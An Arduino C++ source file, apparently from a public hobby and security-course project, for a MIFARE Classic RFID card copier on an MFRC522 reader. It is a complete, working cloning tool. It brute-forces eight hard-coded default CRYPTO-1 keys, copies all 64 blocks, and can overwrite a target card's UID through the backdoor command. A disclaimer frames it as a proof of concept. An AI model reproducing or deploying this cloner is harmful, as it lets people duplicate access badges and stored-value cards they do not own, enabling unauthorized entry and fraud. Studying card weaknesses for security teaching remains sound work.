/* 
 *  A MIFARE Classic card copier that can iterate through 8 typically used CRYPTO-1 encryption keys.
 * Only works if all sections use the same encryption keys, which unfortunately happens more often than you'd think.
 * Please don't break any laws with this. I hold no responsibility for any misuse of this program, this is a proof of concept designed for a network security course.
 * 
 * @author Ludvig Lindblad
 * @version 0.6 2021/07/27
 * Full project: https://github.com/pinmissile/MIFARE-Classic-Copier
 */
 
/* 
 *  Set the full_copy variable to true if you want to make a full copy of a card.
 *  This is potentially dangerous, as it will overwrite the UUID of the card and potentially lock the card from further write operations.
 *  However, some systems use the UUID as authentication, or store data in the authentication blocks. So it might be necessary.
*/
#define full_copy true 

// Library imports
#include <SPI.h>
#include <MFRC522.h>

// Pin definitions
#define YELLOW_LED_PIN 7  // On: Ongoing read/write/auth. Blink: Failed action.
#define BLUE_LED_PIN 8    // Off: Read mode. On: Write mode. Blink: State transition
#define RST_PIN 9
#define SS_PIN 10

MFRC522 mfrc522(SS_PIN, RST_PIN);
MFRC522::MIFARE_Key key_a;
MFRC522::MIFARE_Key key_b;
MFRC522::StatusCode status;

#define PREPROGRAMMED_KEYS 8 // Number of known default keys
// These are the preprogrammed encryption keys which we will use to attempt to copy and write to cards with.
// The program will iterate throughout these in order. 
// Here's a repo of standard MIFARE Classic keys: https://github.com/ikarus23/MifareClassicTool/blob/master/Mifare%20Classic%20Tool/app/src/main/assets/key-files/extended-std.keys
byte knownKeys[PREPROGRAMMED_KEYS][MFRC522::MF_KEY_SIZE] =  {
    {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // FF FF FF FF FF FF
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // 00 00 00 00 00 00
    {0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5}, // A0 A1 A2 A3 A4 A5
    {0xd3, 0xf7, 0xd3, 0xf7, 0xd3, 0xf7}, // D3 F7 D3 F7 D3 F7
    {0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5}, // B0 B1 B2 B3 B4 B5
    {0x4d, 0x3a, 0x99, 0xc3, 0x51, 0xdd}, // 4D 3A 99 C3 51 DD
    {0x1a, 0x98, 0x2c, 0x7e, 0x45, 0x9a}, // 1A 98 2C 7E 45 9A
    {0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff} // AA BB CC DD EE FF
};

// Global variables
byte buffer[18];
byte rfid_data[64][16];

void setup() {
  Serial.begin(9600);
  SPI.begin();                  // MFRC522 communicates via SPI
  mfrc522.PCD_Init();           
  digitalWrite(BLUE_LED_PIN, LOW);  // Turn off the blue LED.
  digitalWrite(YELLOW_LED_PIN, LOW);  // Turn off the yellow LED.
}

void loop() {
  // Read mode. Wait until the RFID reader finds a card.
  Serial.print("Ready.");
  while(!await_and_copy_card());
  blink_led(BLUE_LED_PIN, 1000);
  digitalWrite(YELLOW_LED_PIN, LOW);
  digitalWrite(BLUE_LED_PIN, HIGH);
  // Write mode. Wait until the RFID reader finds a new card.
  while(!await_and_write_card());
  digitalWrite(YELLOW_LED_PIN, LOW);
  blink_led(BLUE_LED_PIN, 1000);
  // All done, go back to read mode.
}
/**
 * Simple LED blinking function.
 * 
 * @param int led_pin Which pin to blink
 * @param int delay_time The time to delay in milliseconds. Will result in 5 times this in total.
*/
void blink_led(int led_pin, int delay_time){
  digitalWrite(led_pin, HIGH);
  delay(delay_time * 2);
  digitalWrite(led_pin, LOW);
  delay(delay_time);
  digitalWrite(led_pin, HIGH);
  delay(delay_time * 2);
  digitalWrite(led_pin, LOW);
}

/**
 * Attempts to establish a connection with a card, at which point it will attempt to find the encryption key and copy the card to RAM.
 * 
 * @return Whether the copy was successful.
*/
bool await_and_copy_card(){
  digitalWrite(YELLOW_LED_PIN, LOW);
  if (!mfrc522.PICC_IsNewCardPresent() || !mfrc522.PICC_ReadCardSerial())
      return false; // Wait until a card shows up.
  digitalWrite(YELLOW_LED_PIN, HIGH);
  // Attempt to crack.
  if(find_key(&key_a, true) && find_key(&key_b, false)){
    // Copy the card to RAM
    for(byte block = 0; block < 64; block++){
      byte byteCount = sizeof(buffer);
      status = mfrc522.MIFARE_Read(block, buffer, &byteCount);
      for (int p = 0; p < 16; p++) {
             rfid_data[block][p] = buffer[p];
      }
    }
    mfrc522.PICC_HaltA();       // Halt PICC
    mfrc522.PCD_StopCrypto1();  // Stop encryption on PCD
    Serial.print("Copy successful.");
    return true;
  }
  blink_led(YELLOW_LED_PIN, 1000);
  Serial.print("Copy fail: Could not find key.");
  return false; // Could not find key.
}

/**
 * Attempts to establish a connection with a card and clone card from RAM.
 * 
 * @return Whether the write was successful.
*/
bool await_and_write_card(){
  digitalWrite(YELLOW_LED_PIN, LOW);
  if ( !mfrc522.PICC_IsNewCardPresent() || !mfrc522.PICC_ReadCardSerial())
      return false; // Wait until a card shows up.
  digitalWrite(YELLOW_LED_PIN, HIGH);
  if(find_key(&key_a, true) && find_key(&key_b, false)){
    // Writing to card block-for-block, don't remove it or you might brick it.
    for(int block = 0; block <= 62; block++){ // Write block for block
      if(!full_copy && (block % 4 == 3 || block < 4)){ 
        continue; // Skips the first block, as well as authentication blocks.
      }
      Serial.print("Writing block ");
      Serial.println(block);

      // Authenticate A-key
      status = (MFRC522::StatusCode) mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key_a, &(mfrc522.uid));
      if (status != MFRC522::STATUS_OK) {
        // Failed authentication.
        Serial.print("Failed auth: A");
        blink_led(YELLOW_LED_PIN, 1000);
        return false;
      }

      // Authenticate B-key
      status = (MFRC522::StatusCode) mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_B, block, &key_b, &(mfrc522.uid));
      if (status != MFRC522::STATUS_OK) {
        // Failed authentication.
        Serial.print("Failed auth: B");
        blink_led(YELLOW_LED_PIN, 1000);
        return false;
      }
      Serial.println(block);
      // Write the block
      if(block==0){
        mfrc522.PCD_StopCrypto1(); // We need to deactivate crypto in order to access the backdoor.
        mfrc522.MIFARE_OpenUidBackdoor(true);
        status = (MFRC522::StatusCode) mfrc522.MIFARE_Write(block, rfid_data[block], 16);
      }
      else{
        status = (MFRC522::StatusCode) mfrc522.MIFARE_Write(block, rfid_data[block], 16);
      }
      if (status != MFRC522::STATUS_OK) {
        // Write failed
        Serial.println("Failed to write.");
        Serial.println(mfrc522.GetStatusCodeName(status));
        blink_led(YELLOW_LED_PIN, 1000);
        return false;
      }
    }
    // Successful write
    mfrc522.PICC_HaltA();       // Halt PICC
    mfrc522.PCD_StopCrypto1();  // Stop encryption on PCD
    return true;
  }
  else{
    // Could not find key. Try to copy to another card.
    blink_led(YELLOW_LED_PIN, 1000);
  }
}

/**
 * Function which brute forces the encryption key with current card in communication, using the preprogrammed keys in memory.
 * If the key is found, it will mutate the key variable to that key.
 * 
 * @param int MFRC522::MIFARE_Key MIFARE Key structure
 * @param boolean check_a True for key A, false for key B.
 * @return Successful key match
*/
bool find_key(MFRC522::MIFARE_Key *key, boolean check_a){
  MFRC522::MIFARE_Key temp_key;
  for (byte k = 0; k < PREPROGRAMMED_KEYS; k++) {
    // Copy the key into the MIFARE_Key structure
    for (byte i = 0; i < MFRC522::MF_KEY_SIZE; i++) {
      temp_key.keyByte[i] = knownKeys[k][i];
      (temp_key.keyByte[i]);
    }
    *key = temp_key;
    // Test it with the card
    for(byte block = 3; block < 64; block += 4){
      // If you're looking for a more sophisticated system, check out MFCUK (MiFare Classic Universal Toolkit).
      if(check_a){
        status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, key, &(mfrc522.uid));
      }
      else{
        status = mfrc522.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_B, block, key, &(mfrc522.uid));
      }
      if (status == MFRC522::STATUS_OK) {
        // Key found and stored in the key variable.
        return true;
      }
    }
    if (!mfrc522.PICC_IsNewCardPresent() || !mfrc522.PICC_ReadCardSerial()){
      // Sudden loss of connection to card. Abort.
      Serial.print("Lost connection while trying to find key.");
      return false;
    }
  }
  // Tried all keys, could not find one that works.
  Serial.print("Could not find key.");
  return false;
}
